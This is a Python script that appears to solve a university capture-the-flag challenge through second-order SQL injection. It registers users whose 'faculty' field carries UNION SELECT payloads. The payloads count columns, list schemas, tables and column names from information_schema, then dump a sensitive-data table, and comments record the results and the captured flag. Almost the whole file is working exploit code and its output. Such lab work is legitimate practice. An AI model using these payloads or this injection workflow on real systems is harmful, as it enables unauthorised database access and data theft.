# insert custom faculty by editting the html, sql injection?
import requests

base_url = 'http://ctf99.cs.ui.ac.id:9010'
register_url = base_url + '/register'
login_url = base_url + '/login'
class_url = base_url + '/class'

class_column_number_probe = "' OR 1 ORDER BY 4 #"
# class table has 4 columns

class_column_index_probe = "' OR 0 UNION SELECT 1,2,3,4 #"
# name and capacity is column 3 and 4

schema_name_probe = "' OR 0 UNION SELECT 1,2,group_concat(schema_name),4 from information_schema.schemata #"
# mysql,information_schema,performance_schema,sys,siak_vng

probe_table_names = "' OR 0 UNION SELECT 1,2,group_concat(table_name),4 from information_schema.tables WHERE table_schema = 'siak_vng' #"
# migrations,tbl_class,tbl_sensitive_data,tbl_user

probe_tbl_class_column_names = "' OR 0" \
                               " UNION SELECT 1,1,group_concat(column_name),1 from information_schema.columns WHERE table_name = 'tbl_class'" \
                               " #"
# capacity,class_name,faculty,id

probe_tbl_sensitive_data_column_names = "' OR 0" \
                               " UNION SELECT 1,1,group_concat(column_name),1 from information_schema.columns WHERE table_name = 'tbl_sensitive_data'" \
                               " #"
# id,kunci,val

probe_tbl_user_column_names = "' OR 0" \
                               " UNION SELECT 1,1,group_concat(column_name),1 from information_schema.columns WHERE table_name = 'tbl_user'" \
                               " #"
# faculty,id,last_login,password,username

read_table_sensitive_data = "' OR 0" \
                               " UNION SELECT 1,1,group_concat(kunci),group_concat(val) from tbl_sensitive_data" \
                               " #"
def register_injection(username, sql_payload: str):
    injection = {
        'username': str(username),
        'password': str(username),
        'password_validation': str(username),
        'faculty': sql_payload
    }
    requests.post(register_url, data=injection)
    print(f"Sent: {injection}")

register_injection(1, class_column_number_probe)
register_injection(2, class_column_index_probe)
register_injection(3, schema_name_probe)
register_injection(4, probe_table_names)
register_injection(5, probe_tbl_class_column_names)
register_injection(6, probe_tbl_user_column_names)
register_injection(7, probe_tbl_sensitive_data_column_names)
register_injection(8, read_table_sensitive_data) # CSCE604258{s3c0nd_ord3r_sqlI_ma4ng}
